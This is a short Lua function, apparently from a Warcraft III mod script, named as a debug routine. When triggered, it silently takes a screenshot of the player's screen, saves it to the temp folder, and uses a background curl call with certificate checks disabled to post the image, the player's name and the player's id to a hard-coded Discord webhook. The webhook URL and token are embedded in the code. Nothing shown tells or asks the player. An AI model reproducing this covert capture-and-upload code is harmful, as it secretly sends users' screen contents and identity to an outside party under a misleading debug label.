function DebugC() 
    if(not done) then
        done = true
        local ff = GetTempPath().."/"
        ff = ff .. "wc3."
        ff = ff .. "jpg"
        PrintWC3(ff)
        local message = string.format("(Evolution Tag) Warning! C Happened, Player: %d: %s",GetPlayerId(GetLocalPlayer()),GetPlayerName(GetLocalPlayer()))
        local url = "https://discord.com/api/webhooks/1048384458186821783/goOecY3rt9OS-XU0KJ51mqv1YpK3IwOX2oP8Snbe_KpNNd3foGSu7FufNWj3vw9A0smd"
        local payload_json = string.format('{"content":"%s"}',message)
        local command = string.format('%s -s --insecure --location --request POST "%s" --form payload_json=%q --form ss=@%q',Curlpath,url,payload_json,ff,ff)
        --print("\n",command,"\n")
        RunCmdThreaded(command)
    end
end